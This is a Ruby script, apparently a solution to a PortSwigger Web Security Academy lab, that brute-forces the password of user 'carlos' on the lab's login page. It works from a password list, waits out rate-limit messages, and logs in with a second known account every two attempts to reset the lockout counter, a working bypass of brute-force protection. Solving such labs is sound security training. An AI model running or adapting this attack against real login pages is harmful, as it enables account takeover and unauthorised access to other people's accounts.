# frozen_string_literal: true

require 'uri'
require 'net/http'
require './valid_login'

TARGET = 'https://0a80002a03e56e2dc0009dec00d000f9.web-security-academy.net/login'

uri = URI(TARGET)

PASSWORDS = 'password_list.txt'
CANDIDATE = 'carlos'

# Used to reset login
valid_login = ValidLogin.new(uri: uri, username: 'wiener', password: 'peter', success_code: '302')
sleep_secs = 60
counter = 0

File.readlines(PASSWORDS).each do |line|
  l = line.strip
  res = Net::HTTP.post_form(uri, username: CANDIDATE, password: l)
  puts "Tried #{CANDIDATE}:#{l}\tcode:#{res.code}"
  counter += 1

  if res.body.include?(
    '<p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>'
  )
    puts "Rate-Limited, sleeing for #{sleep_secs}"
    sleep 60
  end

  if counter >= 2
    valid_login.login
    counter = 0
  end

  next if res.code == '200'

  puts "#{CANDIDATE}:#{l}"
  break
end
